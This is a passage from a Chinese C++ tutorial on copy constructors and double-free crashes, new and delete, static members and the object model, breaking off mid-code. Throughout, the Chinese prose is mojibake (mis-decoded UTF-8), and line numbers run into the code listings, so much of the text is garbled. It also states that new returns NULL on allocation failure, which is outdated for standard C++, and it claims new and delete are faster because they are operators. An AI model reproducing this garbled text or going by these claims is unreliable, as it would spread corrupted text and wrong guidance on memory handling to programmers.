ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234567æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†obj1.name: Peter, obj1.len: 5obj2.name: Peter, obj2.len: 5ææ„å‡½æ•°è¢«è°ƒç”¨äº†ææ„å‡½æ•°è¢«è°ƒç”¨äº†Process finished with exit code 134 (interrupted by signal 6: SIGABRT) é—®é¢˜åˆ†æç”±äºåœ¨ä¸Šè¿°çš„ä»£ç ä¸­ï¼Œæ²¡æœ‰è‡ªå®šä¹‰æ‹·è´æ„é€ å‡½æ•°ï¼Œä½¿ç”¨çš„æ˜¯ C++ ç¼–è¯‘å™¨æä¾›çš„é»˜è®¤æ‹·è´æ„é€ å‡½æ•°ï¼Œå› æ­¤ç¨‹åºå¼‚å¸¸ç»ˆæ­¢è¿è¡Œã€‚é€ æˆç¨‹åºå¼‚å¸¸ç»ˆæ­¢è¿è¡Œçš„æ ¹æœ¬åŸå› æ˜¯ï¼ŒC++ æä¾›çš„é»˜è®¤æ‹·è´æ„é€ å‡½æ•°å±äºæµ…æ‹·è´ï¼Œå½“ç¨‹åºè¿è¡Œç»“æŸä¹‹å‰ï¼Œåœ¨ç¬¬äºŒæ¬¡è°ƒç”¨ä¸Šé¢çš„ææ„å‡½æ•°æ—¶ä¼šå‡ºç°é”™è¯¯ï¼ˆåŒä¸€å—å†…å­˜ç©ºé—´è¢«é‡Šæ”¾äº†ä¸¤æ¬¡ï¼‰ï¼Œåº•å±‚çš„åˆ†æå›¾è§£å¯ä»¥çœ‹è¿™é‡Œã€‚ é—®é¢˜è§£å†³æ˜¾å¼ç¼–å†™è‡ªå®šä¹‰çš„æ‹·è´æ„é€ å‡½æ•°ï¼Œé€šè¿‡å®ç°æ·±æ‹·è´ï¼ˆç”³è¯·æ–°çš„å†…å­˜ç©ºé—´ï¼‰æ¥è§£å†³ä¸Šè¿°çš„é—®é¢˜ï¼Œåº•å±‚çš„åˆ†æå›¾è§£å¯ä»¥çœ‹è¿™é‡Œã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;#include "string.h"using namespace std;class Name {private: char *p; int len;public: Name(const char *name) { cout &lt;&lt; "æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; int length = strlen(name); p = (char *) malloc(length + 1); strcpy(p, name); len = length; } // æ·±æ‹·è´çš„å®ç° Name(const Name &amp;name) { cout &lt;&lt; "æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; int length = name.getLen(); p = (char *) malloc(length + 1); strcpy(p, name.getP()); len = length; } ~Name() { cout &lt;&lt; "ææ„å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; if (p != NULL) { free(p); p = NULL; len = 0; } } char *getP() const { return p; } int getLen() const { return len; }};int main() { Name obj1("Peter"); Name obj3 = obj1; // è‡ªåŠ¨è°ƒç”¨è‡ªå®šä¹‰çš„æ‹·è´æ„é€ å‡½æ•°ï¼ˆæ·±æ‹·è´ï¼‰ cout &lt;&lt; "obj1.name: " &lt;&lt; obj1.getP() &lt;&lt; ", obj1.len: " &lt;&lt; obj1.getLen() &lt;&lt; endl; cout &lt;&lt; "obj3.name: " &lt;&lt; obj3.getP() &lt;&lt; ", obj3.len: " &lt;&lt; obj3.getLen() &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123456æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†obj1.name: Peter, obj1.len: 5obj3.name: Peter, obj3.len: 5ææ„å‡½æ•°è¢«è°ƒç”¨äº†ææ„å‡½æ•°è¢«è°ƒç”¨äº† ç‰¹åˆ«æ³¨æ„ï¼š åœ¨ä»¥ä¸‹çš„ä»£ç ä¸­ï¼Œobj3 = obj1; ä¾æ—§å±äºæµ…æ‹·è´ï¼ˆè¿™é‡Œä¸ä¼šè‡ªåŠ¨è°ƒç”¨æ‹·è´æ„é€ å‡½æ•°ï¼‰ï¼Œæœ€ç»ˆç¨‹åºä¹Ÿä¼šå¼‚å¸¸ç»ˆæ­¢è¿è¡Œã€‚è‹¥å¸Œæœ›è§£å†³è¯¥é—®é¢˜ï¼Œéœ€è¦é‡è½½ C++ çš„ = æ“ä½œç¬¦ï¼Œè¿™é‡Œæš‚æ—¶ä¸å±•å¼€è®¨è®ºã€‚ 12345678int main() { Name obj1("Peter"); Name obj3("Tom"); obj3 = obj1; // æµ…æ‹·è´ï¼Œä¸ä¼šè‡ªåŠ¨è°ƒç”¨æ‹·è´æ„é€ å‡½æ•° cout &lt;&lt; "obj1.name: " &lt;&lt; obj1.getP() &lt;&lt; ", obj1.len: " &lt;&lt; obj1.getLen() &lt;&lt; endl; cout &lt;&lt; "obj3.name: " &lt;&lt; obj3.getP() &lt;&lt; ", obj3.len: " &lt;&lt; obj3.getLen() &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12345678æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†obj1.name: Peter, obj1.len: 5obj3.name: Peter, obj3.len: 5ææ„å‡½æ•°è¢«è°ƒç”¨äº†ææ„å‡½æ•°è¢«è°ƒç”¨äº†Process finished with exit code 134 (interrupted by signal 6: SIGABRT) å¯¹è±¡çš„åŠ¨æ€å»ºç«‹å’Œé‡Šæ”¾ä½¿ç”¨ç±»åå®šä¹‰çš„å¯¹è±¡éƒ½æ˜¯é™æ€çš„ï¼ˆå¦‚ Teacher t(30);ï¼‰ï¼Œåœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¯¹è±¡æ‰€å çš„å†…å­˜ç©ºé—´æ˜¯ä¸èƒ½éšæ—¶é‡Šæ”¾çš„ï¼Œåªæœ‰åœ¨ç¨‹åºè¿è¡Œç»“æŸä¹‹åæ‰ä¼šè¢«é‡Šæ”¾ã€‚ä½†æœ‰æ—¶å€™ç”¨æˆ·å¸Œæœ›åœ¨éœ€è¦ç”¨åˆ°å¯¹è±¡æ—¶æ‰å»ºç«‹å¯¹è±¡ï¼Œåœ¨ä¸éœ€è¦ç”¨è¯¥å¯¹è±¡æ—¶å°±æ’¤é”€å®ƒï¼Œé‡Šæ”¾å®ƒæ‰€å çš„å†…å­˜ç©ºé—´ä»¥ä¾›åˆ«çš„æ•°æ®ä½¿ç”¨ï¼Œè¿™æ ·å¯æé«˜å†…å­˜ç©ºé—´çš„åˆ©ç”¨ç‡ã€‚åœ¨ C++ ä¸­ï¼Œå¯ä»¥ç”¨ new è¿ç®—ç¬¦åŠ¨æ€å»ºç«‹å¯¹è±¡ï¼Œç”¨ delete è¿ç®—ç¬¦åŠ¨æ€æ’¤é”€å¯¹è±¡ã€‚ new å’Œ delete ä»‹ç»åœ¨è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå¸¸å¸¸éœ€è¦åŠ¨æ€åœ°åˆ†é…å’Œæ’¤é”€å†…å­˜ç©ºé—´ï¼Œä¾‹å¦‚å¯¹åŠ¨æ€é“¾è¡¨ä¸­ç»“ç‚¹çš„æ’å…¥ä¸åˆ é™¤ã€‚åœ¨ C è¯­è¨€ä¸­æ˜¯åˆ©ç”¨åº“å‡½æ•° malloc() å’Œ free() æ¥åˆ†é…å’Œæ’¤é”€å†…å­˜ç©ºé—´çš„ã€‚C++ æä¾›äº†è¾ƒç®€ä¾¿è€ŒåŠŸèƒ½è¾ƒå¼ºçš„è¿ç®—ç¬¦ new å’Œ delete æ¥å–ä»£ malloc() å’Œ free() å‡½æ•°ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œnew å’Œ delete æ˜¯è¿ç®—ç¬¦ï¼Œä¸æ˜¯å‡½æ•°ï¼Œå› æ­¤æ‰§è¡Œæ•ˆç‡æ›´é«˜ã€‚è™½ç„¶ä¸ºäº†ä¸ C è¯­è¨€å…¼å®¹ï¼ŒC++ ä»ä¿ç•™ malloc() å’Œ free() å‡½æ•°ï¼Œä½†å»ºè®®ç”¨æˆ·ä¸è¦ä½¿ç”¨ malloc() å’Œ free() å‡½æ•°ï¼Œè€Œæ˜¯ä½¿ç”¨ new å’Œ delete è¿ç®—ç¬¦ã€‚ new å’Œ delete çš„åŸºç¡€è¯­æ³• new è¿ç®—ç¬¦çš„ç®€å•ä½¿ç”¨ä¾‹å­å¦‚ä¸‹ï¼š new int;ï¼šå¼€è¾Ÿä¸€ä¸ªå­˜æ”¾æ•´æ•°çš„å†…å­˜ç©ºé—´ï¼Œè¿”å›ä¸€ä¸ªæŒ‡å‘è¯¥å†…å­˜ç©ºé—´çš„åœ°å€ï¼ˆå³æŒ‡é’ˆï¼‰ new int(100);ï¼šå¼€è¾Ÿä¸€ä¸ªå­˜æ”¾æ•´æ•°çš„ç©ºé—´ï¼Œå¹¶æŒ‡å®šè¯¥æ•´æ•°çš„åˆå€¼ä¸º 100ï¼Œè¿”å›ä¸€ä¸ªæŒ‡å‘è¯¥å†…å­˜ç©ºé—´çš„åœ°å€ï¼ˆå³æŒ‡é’ˆï¼‰ new char[10];ï¼šå¼€è¾Ÿä¸€ä¸ªå­˜æ”¾å­—ç¬¦æ•°ç»„ï¼ˆåŒ…æ‹¬ 10 ä¸ªå…ƒç´ ï¼‰çš„ç©ºé—´ï¼Œè¿”å›é¦–å…ƒç´ çš„åœ°å€ï¼ˆå³æŒ‡é’ˆï¼‰ new int[5][4];ï¼šå¼€è¾Ÿä¸€ä¸ªå­˜æ”¾äºŒç»´æ•´å‹æ•°ç»„ï¼ˆå¤§å°ä¸º 5*4ï¼‰çš„ç©ºé—´ï¼Œè¿”å›é¦–å…ƒç´ çš„åœ°å€ï¼ˆå³æŒ‡é’ˆï¼‰ float *p = new float (3.14159);ï¼šå¼€è¾Ÿä¸€ä¸ªå­˜æ”¾å•ç²¾åº¦æ•°çš„ç©ºé—´ï¼Œå¹¶æŒ‡å®šè¯¥å®æ•°çš„åˆå€¼ä¸º 3.14159ï¼Œå°†è¿”å›çš„è¯¥ç©ºé—´çš„åœ°å€èµ‹ç»™æŒ‡é’ˆå˜é‡ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”¨ new åˆ†é…æ•°ç»„å†…å­˜ç©ºé—´æ—¶ä¸èƒ½æŒ‡å®šåˆå€¼ï¼Œå¦‚æœç”±äºå†…å­˜ä¸è¶³ç­‰åŸå› è€Œå¯¼è‡´æ— æ³•æ­£å¸¸åˆ†é…å†…å­˜ç©ºé—´ï¼Œé‚£ä¹ˆ new ä¼šè¿”å›ä¸€ä¸ªç©ºæŒ‡é’ˆ NULLï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®è¯¥æŒ‡é’ˆçš„å€¼åˆ¤æ–­å†…å­˜ç©ºé—´æ˜¯å¦åˆ†é…æˆåŠŸã€‚ new å’Œ delete çš„ä½¿ç”¨æ¡ˆä¾‹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#include &lt;iostream&gt;using namespace std;class Teacher {private: int _age;public: Teacher(int age) { this-&gt;_age = age; cout &lt;&lt; "æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } ~Teacher() { cout &lt;&lt; "ææ„å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } void setAget(int age) { this-&gt;_age = age; } int getAge() { return this-&gt;_age; }};// Cè¯­è¨€åˆ†é…åŸºç¡€ç±»å‹void functionA() { int *p = (int *) malloc(sizeof(int)); *p = 3; cout &lt;&lt; "functionA -&gt; p = " &lt;&lt; *p &lt;&lt; endl; free(p);}// C++åˆ†é…åŸºç¡€ç±»å‹void functionB() { int *a = new int; *a = 3; cout &lt;&lt; "functionB -&gt; a = " &lt;&lt; *a &lt;&lt; endl; delete a; int *b = new int(30); cout &lt;&lt; "functionB -&gt; b = " &lt;&lt; *b &lt;&lt; endl; delete b;}// Cè¯­è¨€åˆ†é…æ•°ç»„ç±»å‹void functionC() { char *p = (char *) malloc(sizeof(char) * 3); p[0] = \'a\'; p[1] = \'b\'; p[2] = \'c\'; cout &lt;&lt; "functionC -&gt; p = " &lt;&lt; p[0] &lt;&lt; p[1] &lt;&lt; p[2] &lt;&lt; endl; free(p);}// C++åˆ†é…æ•°ç»„ç±»å‹void functionD() { char *p = new char[3]; p[0] = \'e\'; p[1] = \'f\'; p[2] = \'g\'; cout &lt;&lt; "functionD -&gt; p = " &lt;&lt; p[0] &lt;&lt; p[1] &lt;&lt; p[2] &lt;&lt; endl; delete []p;}// Cè¯­è¨€åˆ†é…å¯¹è±¡void functionE() { // è¿™é‡Œä¸ä¼šè‡ªåŠ¨è°ƒç”¨ç±»çš„æ„é€ å‡½æ•°å’Œææ„å‡½æ•° Teacher *p = (Teacher *) malloc(sizeof(Teacher)); p-&gt;setAget(33); cout &lt;&lt; "functionE -&gt; age = " &lt;&lt; p-&gt;getAge() &lt;&lt; endl; free(p);}// C++åˆ†é…å¯¹è±¡void functionF() { // newå’Œdeleteä¼šåˆ†åˆ«è‡ªåŠ¨è°ƒç”¨ç±»çš„æ„é€ å‡½æ•°å’Œææ„å‡½æ•° Teacher *p = new Teacher(35); cout &lt;&lt; "functionF -&gt; age = " &lt;&lt; p-&gt;getAge() &lt;&lt; endl; delete p;}int main() { functionA(); functionB(); functionC(); functionD(); functionE(); functionF(); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123456789functionA -&gt; p = 3functionB -&gt; a = 3functionB -&gt; b = 30functionC -&gt; p = abcfunctionD -&gt; p = efgfunctionE -&gt; age = 33æ„é€ å‡½æ•°è¢«è°ƒç”¨functionF -&gt; age = 35ææ„å‡½æ•°è¢«è°ƒç”¨ ä¸Šé¢çš„ Teacher *p = new Teacher(35); è¿™ç§å†™æ³•ï¼Œæ˜¯å°†ä¸¤ä¸ªè¯­å¥ï¼ˆå®šä¹‰æŒ‡é’ˆå˜é‡å’Œä½¿ç”¨ new å»ºç«‹æ–°å¯¹è±¡ï¼‰åˆå¹¶ä¸ºä¸€ä¸ªè¯­å¥ï¼Œå¹¶æŒ‡å®šåˆå€¼ï¼Œåœ¨è°ƒç”¨å¯¹è±¡æ—¶ï¼Œæ—¢å¯ä»¥é€šè¿‡å¯¹è±¡åï¼Œä¹Ÿå¯ä»¥é€šè¿‡æŒ‡é’ˆã€‚åœ¨æ‰§è¡Œ new è¿ç®—ç¬¦æ—¶ï¼Œå¦‚æœå†…å­˜ç©ºé—´ä¸è¶³ï¼Œæ— æ³•å¼€è¾Ÿæ‰€éœ€çš„å†…å­˜ç©ºé—´ï¼Œç›®å‰å¤§å¤šæ•° C++ ç¼–è¯‘å™¨éƒ½ä¼šè¿”å›ä¸€ä¸ª 0 æŒ‡é’ˆå€¼ã€‚åªè¦æ£€æµ‹è¿”å›å€¼æ˜¯å¦ä¸º 0ï¼Œå°±å¯åˆ¤æ–­å†…å­˜ç©ºé—´æ˜¯å¦åˆ†é…æˆåŠŸã€‚ANSI C++ æ ‡å‡†æå‡ºï¼Œåœ¨æ‰§è¡Œ new å‡ºç°æ•…éšœæ—¶ï¼Œå°±æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œç”¨æˆ·å¯æ ¹æ®å¼‚å¸¸è¿›è¡Œç›¸å…³å¤„ç†ï¼Œä½† C++ æ ‡å‡†ä»ç„¶å…è®¸åœ¨å‡ºç° new æ•…éšœæ—¶è¿”å› 0 æŒ‡é’ˆå€¼ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸åŒçš„ç¼–è¯‘å™¨å¯¹ new æ•…éšœçš„å¤„ç†æ–¹æ³•æ˜¯ä¸åŒçš„ã€‚å½“ä¸å†éœ€è¦ä½¿ç”¨ç”± new å»ºç«‹çš„å¯¹è±¡æ—¶ï¼Œå¯ä»¥ç”¨ delete è¿ç®—ç¬¦äºˆä»¥é‡Šæ”¾ï¼Œæ­¤åç¨‹åºä¸èƒ½å†ä½¿ç”¨è¯¥å¯¹è±¡ã€‚å¦‚æœç”¨ä¸€ä¸ªæŒ‡é’ˆå˜é‡å…ˆåæŒ‡å‘äº†ä¸åŒçš„åŠ¨æ€å¯¹è±¡ï¼Œåº”æ³¨æ„æŒ‡é’ˆå˜é‡çš„å½“å‰æŒ‡å‘ï¼Œä»¥é¿å…é‡Šæ”¾é”™äº†å¯¹è±¡ã€‚åœ¨æ‰§è¡Œ delete è¿ç®—ç¬¦æ—¶ï¼Œåœ¨é‡Šæ”¾å†…å­˜ç©ºé—´ä¹‹å‰ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ç±»çš„ææ„å‡½æ•°ï¼Œå®Œæˆæœ‰å…³å–„åæ¸…ç†å·¥ä½œã€‚ é™æ€æˆå‘˜å˜é‡é™æ€æˆå‘˜å˜é‡çš„æ¦‚å¿µ é™æ€æˆå‘˜å±€éƒ¨äºç±»ï¼Œå®ƒä¸æ˜¯å¯¹è±¡æˆå‘˜ åœ¨ç±»å¤–è®¿é—®é™æ€æˆå‘˜å˜é‡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ ç±»å :: ä½œä¸ºé™å®šè¯ï¼Œæˆ–é€šè¿‡å¯¹è±¡è®¿é—® å…³é”®å­— static å¯ä»¥ç”¨äºå£°æ˜ä¸€ä¸ªç±»çš„æˆå‘˜ï¼Œé™æ€æˆå‘˜æä¾›äº†ä¸€ä¸ªåŒç±»å¯¹è±¡çš„å…±äº«æœºåˆ¶ å°†ä¸€ä¸ªç±»çš„æˆå‘˜å£°æ˜ä¸º static æ—¶ï¼Œè¿™ä¸ªç±»æ— è®ºæœ‰å¤šå°‘ä¸ªå¯¹è±¡è¢«åˆ›å»ºï¼Œè¿™äº›å¯¹è±¡éƒ½å…±äº«è¿™ä¸ª static æˆå‘˜ 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;using namespace std;class Counter {private: // å£°æ˜é™æ€æˆå‘˜å˜é‡ static int num;public : // æˆå‘˜å‡½æ•°è®¿é—®é™æ€æˆå‘˜å˜é‡ void setNum(int i) { num = i; } void showNum() { cout &lt;&lt; num &lt;&lt; endl; }};// å®šä¹‰é™æ€æˆå‘˜å˜é‡ï¼Œè¿™é‡Œä¸æ˜¯ç®€å•çš„å˜é‡èµ‹å€¼ï¼Œæ›´é‡è¦çš„æ˜¯å‘Šè¯‰C++ç¼–è¯‘å™¨ï¼Œç»™é™æ€æˆå‘˜å˜é‡åˆ†é…å†…å­˜int Counter::num = 0;int main() { Counter a, b; a.showNum(); b.showNum(); a.setNum(10); a.showNum(); b.showNum(); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234001010 é™æ€æˆå‘˜å˜é‡çš„ä½¿ç”¨123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;using namespace std;class Counter {public: int mem; // å…¬æœ‰æˆå‘˜å˜é‡ static int smem; // å…¬æœ‰é™æ€æˆå‘˜å˜é‡public : Counter(int num) { mem = num; }};// å®šä¹‰é™æ€æˆå‘˜å˜é‡ï¼Œè¿™é‡Œä¸æ˜¯ç®€å•çš„å˜é‡èµ‹å€¼ï¼Œæ›´é‡è¦çš„æ˜¯å‘Šè¯‰C++ç¼–è¯‘å™¨ï¼Œç»™é™æ€æˆå‘˜å˜é‡åˆ†é…å†…å­˜int Counter::smem = 0;int main() { Counter c(5); for (int i = 0; i &lt; 5; i++) { // è®¿é—®é™æ€æˆå‘˜å˜é‡çš„æ–¹æ³•1ï¼ˆé€šè¿‡ç±»åç›´æ¥è®¿é—®ï¼‰ Counter::smem += i; cout &lt;&lt; "Counter::smem = "&lt;&lt; Counter::smem &lt;&lt; endl; } // è®¿é—®é™æ€æˆå‘˜å˜é‡çš„æ–¹æ³•2ï¼ˆé€šè¿‡å¯¹è±¡è®¿é—®ï¼‰ cout &lt;&lt; "c.smem = " &lt;&lt; c.smem &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123456Counter::smem = 0Counter::smem = 1Counter::smem = 3Counter::smem = 6Counter::smem = 10c.smem = 10 é™æ€æˆå‘˜å‡½æ•°é™æ€æˆå‘˜å‡½æ•°çš„æ¦‚å¿µ é™æ€æˆå‘˜å‡½æ•°ã€é™æ€æˆå‘˜å˜é‡éƒ½å±äºç±»çš„ é™æ€æˆå‘˜å‡½æ•°éƒ½æ˜¯ä»¥å…³é”®å­— static å£°æ˜ åœ¨ç±»å¤–è°ƒç”¨é™æ€æˆå‘˜å‡½æ•°æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ ç±»å :: ä½œä¸ºé™å®šè¯ï¼Œæˆ–é€šè¿‡å¯¹è±¡è®¿é—® é™æ€æˆå‘˜å‡½æ•°æä¾›ä¸ä¾èµ–äºç±»æ•°æ®ç»“æ„çš„å…±åŒæ“ä½œï¼Œå®ƒæ²¡æœ‰ this æŒ‡é’ˆï¼Œè€Œæ™®é€šæˆå‘˜å‡½æ•°åŒ…å«ä¸€ä¸ªæŒ‡å‘å…·ä½“å¯¹è±¡çš„ this æŒ‡é’ˆ é™æ€æˆå‘˜å‡½æ•°çš„ä½¿ç”¨å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨é™æ€æˆå‘˜å‡½æ•°ä¸­ï¼Œä¸èƒ½è®¿é—®æ™®é€šæˆå‘˜å˜é‡å’Œè°ƒç”¨æ™®é€šæˆå‘˜å‡½æ•°ã€‚è¿™æ˜¯å› ä¸ºé™æ€æˆå‘˜å‡½æ•°å±äºæ•´ä¸ªç±»çš„ï¼Œå®ƒæ²¡åŠæ³•åŒºåˆ†æ™®é€šæˆå‘˜å˜é‡å’Œæ™®é€šæˆå‘˜å‡½æ•°æ˜¯å±äºå“ªä¸ªå…·ä½“çš„å¯¹è±¡ï¼›åŒæ—¶åœ¨é™æ€æˆå‘˜å‡½æ•°å†…ï¼Œä¸èƒ½ä½¿ç”¨ this æŒ‡é’ˆã€‚ 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class Counter {private: int num;public: // å£°æ˜é™æ€æˆå‘˜å‡½æ•° static int getNum(Counter *p); static void setNum(int i, Counter *p);};// å®šä¹‰é™æ€æˆå‘˜å‡½æ•°int Counter::getNum(Counter *p) { return p-&gt;num;}void Counter::setNum(int i, Counter *p) { p-&gt;num = i;}int main() { Counter obj; // è®¿é—®é™æ€æˆå‘˜å‡½æ•°çš„æ–¹æ³•1ï¼ˆé€šè¿‡ç±»åç›´æ¥è®¿é—®ï¼‰ Counter::setNum(1, &amp;obj); cout &lt;&lt; "num = " &lt;&lt; Counter::getNum(&amp;obj) &lt;&lt; endl; // è®¿é—®é™æ€æˆå‘˜å‡½æ•°çš„æ–¹æ³•2ï¼ˆé€šè¿‡å¯¹è±¡è®¿é—®ï¼‰ obj.setNum(3, &amp;obj); cout &lt;&lt; "num = " &lt;&lt; obj.getNum(&amp;obj) &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12num = 1num = 3 C++ é¢å‘å¯¹è±¡æ¨¡å‹åˆæ¢å¯¹è±¡æ¨¡å‹æ¦‚è¿°C++ å¯¹è±¡æ¨¡å‹å¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹ä¸¤éƒ¨åˆ†ï¼š å¯¹äºå„ç§ç‰¹æ€§æ”¯æŒçš„åº•å±‚å®ç°æœºåˆ¶ è¯­è¨€ä¸­ç›´æ¥æ”¯æŒé¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡çš„éƒ¨åˆ†ï¼Œä¸»è¦æ¶‰åŠå¦‚æ„é€ å‡½æ•°ã€ææ„å‡½æ•°ã€è™šå‡½æ•°ã€ç»§æ‰¿ï¼ˆå•ç»§æ‰¿ã€å¤šç»§æ‰¿ã€è™šç»§æ‰¿ï¼‰ã€å¤šæ€ç­‰ åœ¨ C è¯­è¨€ä¸­ï¼Œâ€œæ•°æ®â€ å’Œ â€œå¤„ç†æ•°æ®çš„æ“ä½œï¼ˆå‡½æ•°ï¼‰â€ æ˜¯åˆ†å¼€æ¥å£°æ˜çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯­è¨€æœ¬èº«å¹¶æ²¡æœ‰æ”¯æŒ â€œæ•°æ®å’Œå‡½æ•°â€ ä¹‹é—´çš„å…³è”æ€§ã€‚åœ¨ C++ ä¸­ï¼Œé€šè¿‡æŠ½è±¡æ•°æ®ç±»å‹ ADTï¼ˆAbstract Data Typeï¼‰ï¼Œåœ¨ç±»ä¸­å®šä¹‰æ•°æ®å’Œå‡½æ•°æ¥å®ç°æ•°æ®å’Œå‡½æ•°ç›´æ¥çš„ç»‘å®šã€‚æ¦‚æ‹¬æ¥è¯´ï¼Œåœ¨ C++ ç±»ä¸­æœ‰ä¸¤ç§æˆå‘˜æ•°æ®ï¼šstaticã€nonstaticï¼Œä¸‰ç§æˆå‘˜å‡½æ•°ï¼šstaticã€nonstaticã€virtualã€‚ å±æ€§å’Œå‡½æ•°çš„å¤„ç†æœºåˆ¶C++ ä¸­çš„ Class ä»é¢å‘å¯¹è±¡ç†è®ºå‡ºå‘ï¼Œå°†å˜é‡ï¼ˆå±æ€§ï¼‰å’Œå‡½æ•°ï¼ˆæ–¹æ³•ï¼‰é›†ä¸­å®šä¹‰åœ¨ä¸€èµ·ï¼Œç”¨äºæè¿°ç°å®ä¸–ç•Œä¸­çš„ç±»ã€‚ä»è®¡ç®—æœºçš„è§’åº¦ï¼Œç¨‹åºä¾ç„¶ç”±æ•°æ®æ®µå’Œä»£ç æ®µæ„æˆã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;using namespace std;struct S1 { int i; int j; int k;};struct S2 { int i; int j; int k; static int m;};class C1 {public: int i; int j; int k;};class C2 {public: int i; int j; int k; static int m;public: int getK() const { return k; } void setK(int val) { k = val; }};int main() { printf("s1:%d \\n", sizeof(S1)); printf("s2:%d \\n", sizeof(S2)); printf("c1:%d \\n", sizeof(C1)); printf("c2:%d \\n", sizeof(C2)); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234s1:12s2:12c1:12c2:12 é€šè¿‡ä¸Šé¢çš„æ¡ˆä¾‹ï¼Œå¯ä»¥å¾—çŸ¥ C++ ç±»å¯¹è±¡ä¸­çš„æˆå‘˜å˜é‡å’Œæˆå‘˜å‡½æ•°æ˜¯åˆ†å¼€å­˜å‚¨çš„ï¼ŒC è¯­è¨€ä¸­çš„å†…å­˜å››åŒºæ¨¡å‹ä»ç„¶æœ‰æ•ˆã€‚C++ ä¸­ç±»çš„æ™®é€šæˆå‘˜å‡½æ•°éƒ½éšå¼åŒ…å«ä¸€ä¸ªæŒ‡å‘å½“å‰å¯¹è±¡çš„ this æŒ‡é’ˆã€‚ é™æ€æˆå‘˜å˜é‡ï¼šå­˜å‚¨äºå…¨å±€æ•°æ®åŒºä¸­ æ™®é€šæˆå‘˜å˜é‡ï¼šå­˜å‚¨äºå¯¹è±¡ä¸­ï¼Œä¸ struct å˜é‡æœ‰ç›¸åŒçš„å†…å­˜å¸ƒå±€å’Œå­—èŠ‚å¯¹é½æ–¹å¼ æˆå‘˜å‡½æ•°ï¼šå­˜å‚¨äºä»£ç æ®µä¸­ this æŒ‡é’ˆçš„ä½¿ç”¨ å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå½“ä½¿ç”¨ const ä¿®é¥°ç±»æˆå‘˜å‡½æ•°æ—¶ï¼Œæˆå‘˜å‡½æ•°ä¸èƒ½ä¿®æ”¹è¢«è°ƒç”¨å¯¹è±¡çš„å€¼ï¼Œè¿™æ˜¯å› ä¸ºæ­¤æ—¶ const æœ¬è´¨ä¸Šä¿®é¥°çš„æ˜¯ this æŒ‡é’ˆï¼Œé—´æ¥ä¹Ÿè¯´æ˜äº† const ä¸ static å…³é”®å­—ä¸èƒ½åŒæ—¶ä¿®é¥°ç±»æˆå‘˜å‡½æ•°ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;using namespace std;class Test {private: int _cm;public: Test() {} Test(int _m) : _cm(_m) {} int get_cm() const { // _cm = 10; æ˜¯é”™è¯¯å†™æ³•ï¼Œå¯¹è±¡çš„_cmå±æ€§å€¼ä¸èƒ½è¢«æ”¹å˜ return _cm; }};void Cmf(const Test &amp; _tt) { cout &lt;&lt; _tt.get_cm();}int main() { Test t(8); Cmf(t); // æ‰“å°ç»“æœä¸º8 return 0;} å…¨å±€å‡½æ•°ä¸æˆå‘˜å‡½æ•°çš„ä½¿ç”¨12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;iostream&gt;using namespace std;class Test{public: int a; int b;public: Test(int a = 0, int b = 0) { this-&gt;a = a; this-&gt;b = b; } ~Test() { }public: void printT() { cout &lt;&lt; "a:" &lt;&lt; a &lt;&lt; " b: " &lt;&lt; b &lt;&lt; endl; } Test testAdd(Test&amp; t2) { Test tmp(this-&gt;a + t2.a, this-&gt;b + t2.b); return tmp; } //t1.testAdd2(t2); 